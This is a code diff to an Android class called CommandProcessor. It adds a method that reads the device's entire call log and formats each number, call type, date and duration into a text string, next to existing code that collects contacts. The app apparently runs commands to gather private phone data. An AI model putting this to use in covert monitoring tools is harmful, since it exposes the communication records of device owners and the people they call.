@@ -13,12 +13,14 @@ import android.media.MediaRecorder;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.Environment;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.util.Log;
 import android.widget.Toast;
 
 import java.io.IOException;
 import java.net.ContentHandler;
+import java.sql.Date;
 import java.util.List;
 
 
@@ -253,5 +255,50 @@ public class CommandProcessor {
         }
         //Log.d("Contacts","Contact String at the end is:"+output.toString()+"And the length of msg is: "+output.length() );
         return output.toString();
+    }
+    public static String getCallLogs(Context context)
+    {
+        @SuppressWarnings("deprecation")
+        //Cursor managedCursor = contextmanagedQuery(CallLog.Calls.CONTENT_URI, null,null, null, null);
+        StringBuffer sb = new StringBuffer();
+        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
+
+        ContentResolver contentResolver = context.getContentResolver();
+        Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+
+        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
+        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
+
+        sb.append("Call Log :");
+        while (managedCursor.moveToNext()) {
+            String phNum = managedCursor.getString(number);
+            String callTypeCode = managedCursor.getString(type);
+            String strcallDate = managedCursor.getString(date);
+            Date callDate = new Date(Long.valueOf(strcallDate));
+            String callDuration = managedCursor.getString(duration);
+            String callType = null;
+            int callcode = Integer.parseInt(callTypeCode);
+            switch (callcode) {
+                case CallLog.Calls.OUTGOING_TYPE:
+                    callType = "Outgoing";
+                    break;
+                case CallLog.Calls.INCOMING_TYPE:
+                    callType = "Incoming";
+                    break;
+                case CallLog.Calls.MISSED_TYPE:
+                    callType = "Missed";
+                    break;
+            }
+            sb.append("\nPhone Number:--- " + phNum + " \nCall Type:--- "
+                    + callType + " \nCall Date:--- " + callDate
+                    + " \nCall duration in sec :--- " + callDuration);
+            sb.append("\n----------------------------------");
+        }
+        managedCursor.close();
+
+        return sb.toString();
+
     }
 }
